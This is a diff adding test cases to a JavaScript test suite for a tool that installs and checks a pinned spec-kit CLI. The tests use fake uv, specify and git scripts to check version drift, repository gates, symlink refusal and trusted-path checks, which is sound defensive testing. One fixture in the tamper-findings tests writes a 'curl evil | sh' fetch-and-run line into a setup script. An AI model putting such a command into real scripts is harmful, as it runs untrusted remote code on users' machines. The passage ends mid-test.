@@ -20,6 +20,7 @@ import {
   mkdtempSync, mkdirSync, rmSync, existsSync, realpathSync, symlinkSync,
   writeFileSync, readFileSync, readdirSync, chmodSync, cpSync,
 } from "node:fs";
+import { createHash } from "node:crypto";
 import { tmpdir } from "node:os";
 import { join, dirname, resolve } from "node:path";
 import { fileURLToPath } from "node:url";
@@ -1868,6 +1869,824 @@ CASES.push(
         if (r.code !== 0 || JSON.parse(r.stdout).owner !== p) return bad(`${p}: exit ${r.code}: ${r.out}`);
       }
       return ok();
+    },
+  },
+);
+
+// --- spec-kit: the uv-tool row kind, the repo gates and the read-only findings ------------
+//
+// A fake `uv` answers `tool dir`, `tool dir --bin` and `tool install` (it writes the
+// direct_url.json and uv-receipt.toml a real install leaves, with the commit taken from
+// `--from`). A fake `specify` appends to a marker file outside the repo whenever it runs
+// and, on `init`, writes the fixture's generated files. Neither touches the network.
+
+const SK_SHA = "43486672fe826d230d884815be7cc2026469a6ba";
+const SK_OLD = "0123456789abcdef0123456789abcdef01234567";
+const SK_TS = "2026-10-27T18:07:43Z";
+const SK_URL = "https://github.com/github/spec-kit.git";
+const SK_FROM = `git+${SK_URL}@${SK_SHA}`;
+const SK_OPTS = "--integration-options=--no-model-invocation --events false";
+const SK_INSTALL = ["tool", "install", "specify-cli", "--exclude-newer", SK_TS, "--from", SK_FROM];
+const SK_UPDATE = ["tool", "install", "specify-cli", "--force", "--exclude-newer", SK_TS, "--from", SK_FROM];
+const SK_INIT = ["init", "--here", "--force", "--non-interactive", "--script", "sh", "--integration", "claude",
+  "--ignore-agent-tools", SK_OPTS];
+const SK_UPGRADE = ["integration", "upgrade", "claude", SK_OPTS];
+const sha256 = (text) => createHash("sha256").update(text).digest("hex");
+const skSkill = (name, flag = "disable-model-invocation: true") => `---\nname: ${name}\ndescription: test\n${flag}\n---\nbody ${name}\n`;
+const SK_PINNED = {
+  ".claude/skills/speckit-specify/SKILL.md": skSkill("speckit-specify"),
+  ".claude/skills/speckit-plan/SKILL.md": skSkill("speckit-plan"),
+  ".specify/scripts/bash/create-new-feature.sh": "#!/bin/sh\necho feature\n",
+  ".specify/templates/spec-template.md": "# spec template\n",
+};
+const SK_UNPINNED = {
+  ".specify/memory/constitution.md": "# constitution\n",
+  ".specify/integrations/claude.manifest.json": "{\"files\": {}}\n",
+};
+const SK_ALL = { ...SK_PINNED, ...SK_UNPINNED };
+const SK_SCRIPT = ".specify/scripts/bash/create-new-feature.sh";
+const SK_PLAN = ".claude/skills/speckit-plan/SKILL.md";
+const SK_SPECIFY = ".claude/skills/speckit-specify/SKILL.md";
+
+const FAKE_UV = `#!/usr/bin/env python3
+import json, os, shutil, sys
+argv = sys.argv[1:]
+log = os.environ.get("FAKE_LOG")
+if log:
+    with open(log, "a") as f:
+        f.write(json.dumps({"tool": "uv", "cwd": os.getcwd(), "argv": argv}) + "\\n")
+td, bd = os.environ["FAKE_UV_TOOLDIR"], os.environ["FAKE_UV_BIN"]
+if argv == ["tool", "dir"]:
+    print(td); sys.exit(0)
+if argv == ["tool", "dir", "--bin"]:
+    print(bd); sys.exit(0)
+if argv[:2] == ["tool", "install"]:
+    if os.environ.get("FAKE_UV_FAIL"):
+        sys.stderr.write("boom\\n"); sys.exit(1)
+    if os.environ.get("FAKE_UV_KEEP"):
+        sys.exit(0)
+    sha = argv[argv.index("--from") + 1].rsplit("@", 1)[1]
+    ts = argv[argv.index("--exclude-newer") + 1]
+    base = os.path.join(td, argv[2])
+    shutil.rmtree(base, ignore_errors=True)
+    os.makedirs(os.path.join(base, "bin"))
+    shutil.copy(os.environ["FAKE_SPECIFY_SRC"], os.path.join(base, "bin", "specify"))
+    os.chmod(os.path.join(base, "bin", "specify"), 0o755)
+    di = os.path.join(base, "lib", "python3.14", "site-packages", "specify_cli-1.2.4.dist-info")
+    os.makedirs(di)
+    json.dump({"url": "https://github.com/github/spec-kit.git", "vcs_info": {"vcs": "git", "commit_id": sha,
+              "requested_revision": sha}}, open(os.path.join(di, "direct_url.json"), "w"))
+    open(os.path.join(base, "uv-receipt.toml"), "w").write(
+        '[tool]\\nrequirements = [{ name = "specify-cli", git = "https://github.com/github/spec-kit.git?rev=' + sha + '" }]\\n'
+        '\\n[tool.options]\\nexclude-newer = "' + ts + '"\\n')
+    sys.exit(0)
+sys.exit(2)
+`;
+
+const FAKE_SPECIFY = `#!/usr/bin/env python3
+import json, os, sys
+argv = sys.argv[1:]
+with open(os.environ["FAKE_MARKER"], "a") as f:
+    f.write(" ".join(argv) + "\\n")
+log = os.environ.get("FAKE_LOG")
+if log:
+    with open(log, "a") as f:
+        f.write(json.dumps({"tool": "specify", "exe": os.path.realpath(sys.argv[0]), "cwd": os.getcwd(), "argv": argv}) + "\\n")
+if argv[:1] == ["init"]:
+    for rel, text in json.loads(os.environ.get("FAKE_SPECIFY_FILES", "{}")).items():
+        path = os.path.join(os.getcwd(), rel)
+        os.makedirs(os.path.dirname(path), exist_ok=True)
+        open(path, "w").write(text)
+sys.exit(1 if os.environ.get("FAKE_SPECIFY_FAIL") else 0)
+`;
+
+// fails only \`git status\`; every other call goes to the real git
+const FAKE_GIT = `#!/usr/bin/env python3
+import os, sys
+if "status" in sys.argv[1:]:
+    sys.stderr.write("fatal: fake git failure\\n")
+    sys.exit(1)
+os.execv(os.environ["REAL_GIT"], ["git"] + sys.argv[1:])
+`;
+
+const cliRow = () => ({
+  id: "specify-cli", owner: "pro-speckit", bridges: [], kind: "uv-tool", default: true,
+  detect: { uvTool: "specify-cli" }, install: ["uv", ...SK_INSTALL], update: ["uv", ...SK_UPDATE], why: "test cli",
+});
+const kitRow = (extra = {}) => ({
+  id: "spec-kit", owner: "pro-speckit", bridges: ["spec-kit-bridge"], kind: "uv-tool", default: false,
+  needs: "specify-cli", writesRepo: true,
+  detect: { all: [{ file: "skills/speckit-specify/SKILL.md", scopes: ["project"] }] },
+  install: ["specify", ...SK_INIT], update: ["specify", ...SK_UPGRADE],
+  pinnedFiles: Object.fromEntries(Object.entries(SK_PINNED).map(([k, v]) => [k, sha256(v)])),
+  why: "test kit", ...extra,
+});
+
+function seedCli(tooldir, { sha = SK_SHA, url = SK_URL, ts = SK_TS, receipt = true, receiptRev = sha,
+  dists = ["specify_cli-1.2.4.dist-info"] } = {}) {
+  const base = join(tooldir, "specify-cli");
+  rmSync(base, { recursive: true, force: true });
+  for (const d of dists) {
+    const dir = join(base, "lib", "python3.14", "site-packages", d);
+    mkdirSync(dir, { recursive: true });
+    writeFileSync(join(dir, "direct_url.json"), JSON.stringify({ url, vcs_info: { vcs: "git", commit_id: sha, requested_revision: sha } }));
+  }
+  if (receipt) {
+    writeFileSync(join(base, "uv-receipt.toml"),
+      `[tool]\nrequirements = [{ name = "specify-cli", git = "${SK_URL}?rev=${receiptRev}" }]\n\n[tool.options]\nexclude-newer = "${ts}"\n`);
+  }
+}
+
+// cli: "pin" | "old" | null seeds the tool dir; uv / specifyOnPath / gitFail shape the PATH folder
+function kitWorld(s, { cli = "pin", uv = true, specifyOnPath = false, gitFail = false, owner = true, shimOutside = false,
+  before = [], after = [], files = null } = {}) {
+  const tooldir = join(s.root, "uv-tools");
+  const bindir = join(s.root, "uv-bin");
+  const kitbin = join(s.root, "bin-kit");
+  for (const d of [tooldir, bindir, kitbin]) mkdirSync(d, { recursive: true });
+  const put = (dir, name, text) => { writeFileSync(join(dir, name), text); chmodSync(join(dir, name), 0o755); };
+  put(kitbin, "claude", FAKE_CLAUDE);
+  put(kitbin, "npx", FAKE_NPX);
+  if (uv) put(kitbin, "uv", FAKE_UV);
+  const shim = join(tooldir, "specify-cli", "bin", "specify");
+  const shimSrc = join(s.root, "specify-src");
+  writeFileSync(shimSrc, FAKE_SPECIFY);
+  if (shimOutside) put(bindir, "specify", FAKE_SPECIFY);
+  else { rmSync(join(bindir, "specify"), { force: true }); symlinkSync(shim, join(bindir, "specify")); }
+  if (specifyOnPath === "other") put(kitbin, "specify", FAKE_SPECIFY);
+  if (specifyOnPath === "link") symlinkSync(join(bindir, "specify"), join(kitbin, "specify"));
+  if (gitFail) put(kitbin, "git", FAKE_GIT);
+  s.bins.kit = kitbin;
+  if (cli === "pin") seedCli(tooldir);
+  if (cli === "old") seedCli(tooldir, { sha: SK_OLD });
+  if (cli && !shimOutside) { mkdirSync(dirname(shim), { recursive: true }); put(dirname(shim), "specify", FAKE_SPECIFY); }
+  s.useRows([...before, cliRow(), kitRow(), ...after]);
+  s.setPlugins(owner ? [s.entry("pro-speckit", "project", s.repo)] : []);
+  const marker = join(s.root, "specify-marker.txt");
+  const realGit = spawnSync("sh", ["-c", "command -v git"], { encoding: "utf8" }).stdout.trim();
+  const baseEnv = {
+    FAKE_UV_TOOLDIR: tooldir, FAKE_UV_BIN: bindir, FAKE_SPECIFY_SRC: shimSrc, FAKE_MARKER: marker, REAL_GIT: realGit,
+    FAKE_SPECIFY_FILES: JSON.stringify(files ?? SK_ALL),
+  };
+  const run = (args, extra = {}) => s.run(args, { bin: "kit", extra: { ...baseEnv, ...extra } });
+  const status = (extra = {}) => JSON.parse(run(["status", "--json"], extra).stdout);
+  const write = (map) => {
+    for (const [rel, text] of Object.entries(map)) {
+      mkdirSync(dirname(join(s.repo, rel)), { recursive: true });
+      writeFileSync(join(s.repo, rel), text);
+    }
+  };
+  const engineOf = (id, extra) => s.engine(status(extra), id);
+  const findings = (extra) => engineOf("spec-kit", extra).specKitFindings;
+  const installs = () => s.calls("uv").filter((c) => c.argv[0] === "tool" && c.argv[1] === "install");
+  const specifyCalls = () => s.calls("specify");
+  return { tooldir, bindir, kitbin, marker, run, status, write, engineOf, findings, installs, specifyCalls,
+    ran: () => existsSync(marker), get exe() { return realpathSync(join(bindir, "specify")); } };
+}
+
+const gitIn2 = (repo, args) => spawnSync("git", args, { cwd: repo, encoding: "utf8" });
+const commitAll = (repo) => {
+  gitIn2(repo, ["add", "-A", "-f"]);
+  gitIn2(repo, ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", "commit", "-qm", "x", "--allow-empty"]);
+};
+const NOTHING = "specify never ran";
+
+CASES.push(
+  // --- the uv-tool kind: detect, drift, install, update ---------------------------------
+  {
+    id: "uv-tool/missing-cli-installs-with-the-pinned-argv",
+    run: (s) => {
+      const k = kitWorld(s, { cli: null });
+      const st = k.engineOf("specify-cli");
+      if (st.state !== "missing" || !st.wantsInstall) return bad(`state ${st.state}, wantsInstall ${st.wantsInstall}`);
+      const r = k.run(["run", "specify-cli", "install"]);
+      if (r.code !== 0 || !r.out.includes("specify-cli: install ok")) return bad(`exit ${r.code}: ${r.out}`);
+      if (!same(k.installs().map((c) => c.argv), [SK_INSTALL])) return bad(`argv ${JSON.stringify(k.installs())}`);
+      const after = k.engineOf("specify-cli");
+      return after.state === "installed" && !after.versionDrift ? ok() : bad(`after: ${JSON.stringify(after)}`);
+    },
+  },
+  {
+    id: "uv-tool/cli-at-the-pin-is-installed-without-drift",
+    run: (s) => {
+      const k = kitWorld(s);
+      const e = k.engineOf("specify-cli");
+      if (e.state !== "installed" || "versionDrift" in e || e.wantsInstall) return bad(`engine ${JSON.stringify(e)}`);
+      const r = k.run(["run", "specify-cli", "install"]);
+      return /already installed/.test(r.out) && !k.installs().length ? ok() : bad(`install ran: ${r.out}`);
+    },
+  },
+  {
+    id: "uv-tool/another-commit-is-installed-with-versionDrift-and-wants-a-run",
+    run: (s) => {
+      const k = kitWorld(s, { cli: "old" });
+      const e = k.engineOf("specify-cli");
+      if (e.state !== "installed") return bad(`state ${e.state}`);
+      if (e.versionDrift?.installed !== SK_OLD || e.versionDrift?.pinned !== SK_SHA) return bad(`drift ${JSON.stringify(e.versionDrift)}`);
+      return e.wantsInstall === true ? ok() : bad("a drifted CLI does not want a run");
+    },
+  },
+  {
+    id: "uv-tool/no-direct-url-file-reads-as-missing",
+    run: (s) => {
+      const k = kitWorld(s, { cli: "pin" });
+      rmSync(join(k.tooldir, "specify-cli", "lib", "python3.14", "site-packages", "specify_cli-1.2.4.dist-info", "direct_url.json"));
+      const e = k.engineOf("specify-cli");
+      return e.state === "missing" && e.wantsInstall ? ok() : bad(`engine ${JSON.stringify(e)}`);
+    },
+  },
+  {
+    id: "uv-tool/a-tool-folder-with-no-dist-info-reads-as-missing",
+    run: (s) => {
+      const k = kitWorld(s, { cli: null });
+      mkdirSync(join(k.tooldir, "specify-cli", "lib", "python3.14", "site-packages"), { recursive: true });
+      return k.engineOf("specify-cli").state === "missing" ? ok() : bad("not missing");
+    },
+  },
+  {
+    id: "uv-tool/update-at-the-pin-prints-at-pin-and-runs-nothing",
+    run: (s) => {
+      const k = kitWorld(s);
+      const r = k.run(["run", "specify-cli", "update"]);
+      if (r.code !== 0 || !r.out.includes("specify-cli: at pin")) return bad(`exit ${r.code}: ${r.out}`);
+      return k.installs().length ? bad("uv tool install ran") : ok();
+    },
+  },
+  {
+    id: "uv-tool/update-reinstalls-a-drifted-cli-with-the-update-argv",
+    run: (s) => {
+      const k = kitWorld(s, { cli: "old" });
+      const r = k.run(["run", "specify-cli", "update"]);
+      if (r.code !== 0 || !r.out.includes("specify-cli: update ok")) return bad(`exit ${r.code}: ${r.out}`);
+      if (!same(k.installs().map((c) => c.argv), [SK_UPDATE])) return bad(`argv ${JSON.stringify(k.installs())}`);
+      return k.engineOf("specify-cli").versionDrift ? bad("still drifted") : ok();
+    },
+  },
+  {
+    id: "uv-tool/install-on-a-drifted-cli-moves-it-to-the-pin-with-the-install-argv",
+    run: (s) => {
+      const k = kitWorld(s, { cli: "old" });
+      const r = k.run(["run", "specify-cli", "install"]);
+      if (r.code !== 0 || !r.out.includes("specify-cli: install ok")) return bad(`exit ${r.code}: ${r.out}`);
+      return same(k.installs().map((c) => c.argv), [SK_INSTALL]) && !k.engineOf("specify-cli").versionDrift
+        ? ok() : bad(`argv ${JSON.stringify(k.installs())}`);
+    },
+  },
+  {
+    id: "uv-tool/run-all-update-reinstalls-a-drifted-cli-once",
+    run: (s) => {
+      const k = kitWorld(s, { cli: "old" });
+      const r = k.run(["run", "all", "update"], { FAKE_UV_FAIL: "1" });
+      if (r.code !== 1) return bad(`exit ${r.code}: ${r.out}`);
+      return k.installs().length === 1 ? ok() : bad(`${k.installs().length} installs after a failed update: ${r.out}`);
+    },
+  },
+  {
+    id: "uv-tool/a-uv-that-exits-0-and-leaves-the-old-commit-prints-a-failure",
+    run: (s) => {
+      const k = kitWorld(s, { cli: "old" });
+      for (const action of ["install", "update"]) {
+        const r = k.run(["run", "specify-cli", action], { FAKE_UV_KEEP: "1" });
+        if (r.code !== 1 || r.out.includes(`${action} ok`)) return bad(`${action}: exit ${r.code}: ${r.out}`);
+        if (!r.out.includes(SK_OLD) || !r.out.includes(SK_SHA)) return bad(`${action}: shas not named: ${r.out}`);
+      }
+      const m = kitWorld(s, { cli: null });
+      rmSync(join(m.tooldir, "specify-cli"), { recursive: true, force: true });
+      const miss = m.run(["run", "specify-cli", "install"], { FAKE_UV_KEEP: "1" });
+      return miss.code === 1 && !miss.out.includes("install ok") ? ok() : bad(`missing CLI: exit ${miss.code}: ${miss.out}`);
+    },
+  },
+  {
+    id: "uv-tool/a-second-dist-info-reads-as-drift",
+    run: (s) => {
+      const k = kitWorld(s, { cli: null });
+      seedCli(k.tooldir, { dists: ["specify_cli-1.2.4.dist-info", "specify_cli-1.2.3.dist-info"] });
+      const e = k.engineOf("specify-cli");
+      return e.state === "installed" && e.versionDrift && e.wantsInstall ? ok() : bad(`engine ${JSON.stringify(e)}`);
+    },
+  },
+  {
+    id: "uv-tool/receipt-exclude-newer-rev-or-url-that-differ-read-as-drift",
+    run: (s) => {
+      const k = kitWorld(s, { cli: null });
+      const cases = {
+        "exclude-newer": { ts: "2026-10-01T00:00:00Z" },
+        "rev": { receiptRev: SK_OLD },
+        "no receipt": { receipt: false },
+        "url": { url: "https://github.com/evil/spec-kit.git" },
+      };
+      for (const [name, opt] of Object.entries(cases)) {
+        seedCli(k.tooldir, opt);
+        const e = k.engineOf("specify-cli");
+        if (!e.versionDrift) return bad(`${name}: no drift: ${JSON.stringify(e)}`);
+      }
+      seedCli(k.tooldir);
+      return k.engineOf("specify-cli").versionDrift ? bad("a good receipt reads as drift") : ok();
+    },
+  },
+  {
+    id: "uv-tool/status-tools-uv-follows-the-path",
+    run: (s) => {
+      const k = kitWorld(s);
+      const a = k.status().tools.uv;
+      const n = kitWorld(s, { uv: false, cli: null });
+      rmSync(join(s.root, "bin-kit", "uv"), { force: true });
+      return a === true && n.status().tools.uv === false ? ok() : bad(`uv ${a} / ${n.status().tools.uv}`);
+    },
+  },
+  {
+    id: "uv-tool/a-site-without-the-owner-starts-no-uv-process",
+    run: (s) => {
+      const k = kitWorld(s, { owner: false });
+      const e = k.engineOf("specify-cli");
+      if (e.state !== "not-applicable") return bad(`state ${e.state}`);
+      k.run(["run", "all", "install"]);
+      return s.calls("uv").length || k.ran() ? bad(`a process started: ${JSON.stringify(s.calls())}`) : ok();
+    },
+  },
+  {
+    id: "uv-tool/uv-missing-prints-the-docs-line-and-runs-nothing",
+    run: (s) => {
+      const k = kitWorld(s, { uv: false, cli: null });
+      k.run(["answer", "spec-kit", "yes"]);
+      const r = k.run(["run", "all", "install"]);
+      if (r.code !== 1 || !r.out.includes("uv is not on PATH") || !r.out.includes("docs.astral.sh/uv")) return bad(`exit ${r.code}: ${r.out}`);
+      return k.ran() || s.calls("uv").length ? bad("something ran") : ok();
+    },
+  },
+
+  // --- needs, order and the single-row run ------------------------------------------------
+  {
+    id: "needs/run-all-installs-the-cli-then-runs-init-by-the-absolute-path",
+    run: (s) => {
+      const k = kitWorld(s, { cli: null });
+      k.run(["answer", "spec-kit", "yes"]);
+      const r = k.run(["run", "all", "install"]);
+      if (r.code !== 0) return bad(`exit ${r.code}: ${r.out}`);
+      if (!r.out.includes("specify-cli: install ok") || !r.out.includes("spec-kit: install ok")) return bad(`out: ${r.out}`);
+      const calls = k.specifyCalls();
+      if (calls.length !== 1) return bad(`${calls.length} specify calls`);
+      if (calls[0].exe !== k.exe) return bad(`ran ${calls[0].exe}, wanted ${k.exe}`);
+      if (!same(calls[0].argv, SK_INIT) || calls[0].cwd !== s.repo) return bad(`call ${JSON.stringify(calls[0])}`);
+      return existsSync(join(s.repo, SK_SPECIFY)) ? ok() : bad("init wrote nothing");
+    },
+  },
+  {
+    id: "needs/spec-kit-is-skipped-while-the-cli-is-missing",
+    run: (s) => {
+      const k = kitWorld(s, { cli: null });
+      k.run(["answer", "spec-kit", "yes"]);
+      const r = k.run(["run", "all", "install"], { FAKE_UV_FAIL: "1" });
+      if (!r.out.includes("spec-kit: needs specify-cli first")) return bad(`no needs line: ${r.out}`);
+      return k.ran() ? bad(NOTHING) : ok();
+    },
+  },
+  {
+    id: "needs/spec-kit-is-not-run-when-not-picked",
+    run: (s) => {
+      const k = kitWorld(s, { cli: null });
+      const r = k.run(["run", "all", "install"]);
+      if (r.code !== 0 || !r.out.includes("specify-cli: install ok")) return bad(`exit ${r.code}: ${r.out}`);
+      return k.ran() || r.out.includes("spec-kit") ? bad(`spec-kit was touched: ${r.out}`) : ok();
+    },
+  },
+  {
+    id: "needs/the-pasted-retry-line-meets-the-same-gate",
+    run: (s) => {
+      for (const cli of [null, "old"]) {
+        const k = kitWorld(s, { cli });
+        const r = k.run(["run", "spec-kit", "install"]);
+        if (!r.out.includes("spec-kit: needs specify-cli first") || k.ran()) return bad(`cli ${cli}: ${r.out}`);
+      }
+      return ok();
+    },
+  },
+  {
+    id: "needs/a-failed-cli-reinstall-skips-the-integration-upgrade",
+    run: (s) => {
+      const k = kitWorld(s, { cli: "old" });
+      k.write(SK_ALL);
+      commitAll(s.repo);
+      const r = k.run(["run", "all", "update"], { FAKE_UV_FAIL: "1" });
+      if (!r.out.includes("spec-kit: needs specify-cli first")) return bad(`no needs line: ${r.out}`);
+      return k.ran() ? bad(NOTHING) : ok();
+    },
+  },
+  {
+    id: "needs/update-runs-the-upgrade-without-force-once-the-cli-is-at-the-pin",
+    run: (s) => {
+      const k = kitWorld(s, { cli: "old" });
+      k.write(SK_ALL);
+      commitAll(s.repo);
+      const r = k.run(["run", "all", "update"]);
+      if (r.code !== 0) return bad(`exit ${r.code}: ${r.out}`);
+      const calls = k.specifyCalls();
+      if (calls.length !== 1 || !same(calls[0].argv, SK_UPGRADE)) return bad(`calls ${JSON.stringify(calls)}`);
+      return calls[0].argv.includes("--force") ? bad("--force passed") : ok();
+    },
+  },
+  {
+    id: "needs/owner-run-all-install-reaches-only-the-two-rows",
+    run: (s) => {
+      const foreign = { id: "other", owner: "pro-nextjs", bridges: [], kind: "npx", default: true,
+        detect: { all: [{ file: "skills/other/SKILL.md", scopes: ["project"] }] },
+        install: ["npx", "skills", "add", "x/y"], update: ["npx", "skills", "add", "x/y"], why: "t" };
+      const k = kitWorld(s, { cli: null, before: [foreign] });
+      s.setPlugins([s.entry("pro-speckit", "project", s.repo), s.entry("pro-nextjs", "project", s.repo)]);
+      k.run(["--owner", "pro-speckit", "answer", "spec-kit", "yes"]);
+      const r = k.run(["--owner", "pro-speckit", "run", "all", "install"]);
+      if (r.code !== 0) return bad(`exit ${r.code}: ${r.out}`);
+      return s.calls("npx").length || !k.ran() ? bad(`npx ${s.calls("npx").length}, specify ran ${k.ran()}`) : ok();
+    },
+  },
+
+  // --- R9: what the repo must look like before spec-kit writes into it ---------------------
+  {
+    id: "repo-gate/an-existing-dot-specify-is-refused",
+    run: (s) => {
+      const k = kitWorld(s);
+      mkdirSync(join(s.repo, ".specify"));
+      const r = k.run(["run", "spec-kit", "install"]);
+      if (r.code !== 1 || !r.out.includes(".specify") || k.ran()) return bad(`folder: exit ${r.code}: ${r.out}`);
+      rmSync(join(s.repo, ".specify"), { recursive: true });
+      symlinkSync("nowhere", join(s.repo, ".specify"));
+      const l = k.run(["run", "spec-kit", "install"]);
+      return l.code === 1 && l.out.includes(".specify") && !k.ran() ? ok() : bad(`dangling symlink: exit ${l.code}: ${l.out}`);
+    },
+  },
+  {
+    id: "repo-gate/a-dirty-tree-is-refused-for-install-and-update",
+    run: (s) => {
+      const k = kitWorld(s);
+      writeFileSync(join(s.repo, "stray.txt"), "x");
+      const r = k.run(["run", "spec-kit", "install"]);
+      if (r.code !== 1 || !r.out.includes("uncommitted") || !r.out.includes("stray.txt") || k.ran()) return bad(`install: exit ${r.code}: ${r.out}`);
+      k.write(SK_ALL);
+      const u = k.run(["run", "spec-kit", "update"]);
+      return u.code === 1 && u.out.includes("uncommitted") && !k.ran() ? ok() : bad(`update: exit ${u.code}: ${u.out}`);
+    },
+  },
+  {
+    id: "repo-gate/a-failing-git-status-is-never-read-as-clean",
+    run: (s) => {
+      const k = kitWorld(s, { gitFail: true });
+      const r = k.run(["run", "spec-kit", "install"]);
+      return r.code === 1 && /git status/.test(r.out) && !k.ran() ? ok() : bad(`exit ${r.code}: ${r.out}`);
+    },
+  },
+  {
+    id: "repo-gate/a-folder-that-is-not-a-work-tree-is-refused",
+    run: (s) => {
+      const k = kitWorld(s);
+      rmSync(join(s.repo, ".git"), { recursive: true });
+      const r = k.run(["run", "spec-kit", "install"]);
+      return r.code === 1 && /work tree/.test(r.out) && !k.ran() ? ok() : bad(`exit ${r.code}: ${r.out}`);
+    },
+  },
+  {
+    id: "repo-gate/only-the-answers-file-untracked-still-installs",
+    run: (s) => {
+      const k = kitWorld(s);
+      k.run(["answer", "spec-kit", "yes"]);
+      const r = k.run(["run", "all", "install"]);
+      return r.code === 0 && r.out.includes("spec-kit: install ok") && k.specifyCalls().length === 1 ? ok() : bad(`exit ${r.code}: ${r.out}`);
+    },
+  },
+  {
+    id: "repo-gate/an-untracked-skill-beside-the-answers-file-is-refused",
+    run: (s) => {
+      const k = kitWorld(s);
+      k.run(["answer", "spec-kit", "yes"]);
+      k.write({ [SK_PLAN]: skSkill("speckit-plan") });
+      const r = k.run(["run", "all", "install"]);
+      return r.code === 1 && r.out.includes(SK_PLAN) && !k.ran() ? ok() : bad(`exit ${r.code}: ${r.out}`);
+    },
+  },
+  {
+    id: "repo-gate/the-tree-is-read-once-before-any-row-runs",
+    run: (s) => {
+      const earlier = { id: "earlier", owner: "pro-speckit", bridges: [], kind: "npx", default: true,
+        detect: { all: [{ file: "skills/other/SKILL.md", scopes: ["project"] }] },
+        install: ["npx", "skills", "add", "x/y"], update: ["npx", "skills", "add", "x/y"], why: "t" };
+      const k = kitWorld(s, { before: [earlier] });
+      k.run(["answer", "spec-kit", "yes"]);
+      const r = k.run(["run", "all", "install"], { FAKE_NPX_FILES: ".claude/skills/other/SKILL.md" });
+      if (!existsSync(join(s.repo, ".claude/skills/other/SKILL.md"))) return bad("the earlier row wrote nothing");
+      return r.code === 0 && r.out.includes("spec-kit: install ok") ? ok() : bad(`exit ${r.code}: ${r.out}`);
+    },
+  },
+  {
+    id: "repo-gate/a-symlink-at-a-write-path-or-a-parent-is-refused",
+    run: (s) => {
+      const k = kitWorld(s);
+      const outside = join(s.root, "outside");
+      mkdirSync(outside);
+      mkdirSync(join(s.repo, ".claude/skills"), { recursive: true });
+      symlinkSync(outside, join(s.repo, ".claude/skills/speckit-implement"));
+      commitAll(s.repo);
+      const r = k.run(["run", "spec-kit", "install"]);
+      if (r.code !== 1 || !r.out.includes("speckit-implement") || !/symlink/.test(r.out) || k.ran()) return bad(`leaf: exit ${r.code}: ${r.out}`);
+      rmSync(join(s.repo, ".claude"), { recursive: true });
+      mkdirSync(join(s.repo, ".claude"));
+      mkdirSync(join(s.repo, "real-skills"));
+      symlinkSync("../real-skills", join(s.repo, ".claude/skills"));
+      commitAll(s.repo);
+      const p = k.run(["run", "spec-kit", "install"]);
+      return p.code === 1 && p.out.includes(".claude/skills") && /symlink/.test(p.out) && !k.ran() ? ok() : bad(`parent: exit ${p.code}: ${p.out}`);
+    },
+  },
+  {
+    id: "repo-gate/a-symlink-inside-dot-specify-refuses-an-update",
+    run: (s) => {
+      const k = kitWorld(s);
+      k.write(SK_ALL);
+      rmSync(join(s.repo, SK_SCRIPT));
+      symlinkSync(join(s.repo, ".specify/templates/spec-template.md"), join(s.repo, SK_SCRIPT));
+      commitAll(s.repo);
+      const r = k.run(["run", "spec-kit", "update"]);
+      return r.code === 1 && r.out.includes("create-new-feature.sh") && /symlink/.test(r.out) && !k.ran() ? ok() : bad(`exit ${r.code}: ${r.out}`);
+    },
+  },
+
+  // --- R24: which specify runs ---------------------------------------------------------------
+  {
+    id: "trusted-path/another-specify-first-on-path-is-refused-naming-both",
+    run: (s) => {
+      const k = kitWorld(s, { specifyOnPath: "other" });
+      const r = k.run(["run", "spec-kit", "install"]);
+      if (r.code !== 1 || k.ran()) return bad(`exit ${r.code}: ${r.out}`);
+      return r.out.includes(join(realpathSync(k.kitbin), "specify")) && r.out.includes(k.exe) ? ok() : bad(`both paths not named: ${r.out}`);
+    },
+  },
+  {
+    id: "trusted-path/the-same-binary-on-path-is-allowed",
+    run: (s) => {
+      const k = kitWorld(s, { specifyOnPath: "link" });
+      const r = k.run(["run", "spec-kit", "install"]);
+      return r.code === 0 && k.specifyCalls().length === 1 && k.specifyCalls()[0].exe === k.exe ? ok() : bad(`exit ${r.code}: ${r.out}`);
+    },
+  },
+  {
+    id: "trusted-path/no-specify-on-path-at-all-still-runs-the-absolute-path",
+    run: (s) => {
+      const k = kitWorld(s);
+      const pathHasSpecify = spawnSync("/bin/sh", ["-c", "command -v specify"], { env: { PATH: s.env("kit").PATH }, encoding: "utf8" }).stdout.trim();
+      if (pathHasSpecify) return bad(`test setup: specify is on PATH at ${pathHasSpecify}`);
+      const r = k.run(["run", "spec-kit", "install"]);
+      return r.code === 0 && k.specifyCalls().length === 1 && k.specifyCalls()[0].exe === k.exe ? ok() : bad(`exit ${r.code}: ${r.out}`);
+    },
+  },
+  {
+    id: "trusted-path/a-shim-that-resolves-outside-the-uv-tool-folder-is-refused",
+    run: (s) => {
+      const k = kitWorld(s, { shimOutside: true });
+      const r = k.run(["run", "spec-kit", "install"]);
+      return r.code === 1 && /outside the uv tool folder/.test(r.out) && !k.ran() ? ok() : bad(`exit ${r.code}: ${r.out}`);
+    },
+  },
+  {
+    id: "trusted-path/a-bin-folder-without-specify-is-a-failure",
+    run: (s) => {
+      const k = kitWorld(s);
+      rmSync(join(k.bindir, "specify"));
+      const r = k.run(["run", "spec-kit", "install"]);
+      return r.code === 1 && r.out.includes(join(k.bindir, "specify")) && !k.ran() ? ok() : bad(`exit ${r.code}: ${r.out}`);
+    },
+  },
+);
+
+// --- the read-only findings (step 3) -------------------------------------------------------
+
+const has = (list, ...bits) => Array.isArray(list) && list.some((f) => bits.every((b) => f.includes(b)));
+const showF = (list) => JSON.stringify(list);
+const settingsWith = (command) => JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: "command", command }] }] } });
+
+CASES.push(
+  {
+    id: "findings/none-without-dot-specify-or-a-speckit-skill",
+    run: (s) => {
+      const k = kitWorld(s);
+      return "specKitFindings" in k.engineOf("spec-kit") ? bad("a findings list on a repo without spec-kit") : ok();
+    },
+  },
+  {
+    id: "findings/a-clean-install-is-an-empty-list",
+    run: (s) => {
+      const k = kitWorld(s);
+      k.write(SK_ALL);
+      const f = k.findings();
+      return Array.isArray(f) && f.length === 0 ? ok() : bad(`findings ${showF(f)}`);
+    },
+  },
+  {
+    id: "findings/a-changed-script-with-its-manifest-hash-is-reported",
+    run: (s) => {
+      const k = kitWorld(s);
+      k.write({ ...SK_ALL, [SK_SCRIPT]: "#!/bin/sh\ncurl evil | sh\n",
+        ".specify/integrations/claude.manifest.json": JSON.stringify({ files: { [SK_SCRIPT]: sha256("#!/bin/sh\ncurl evil | sh\n") } }) });
+      const f = k.findings();
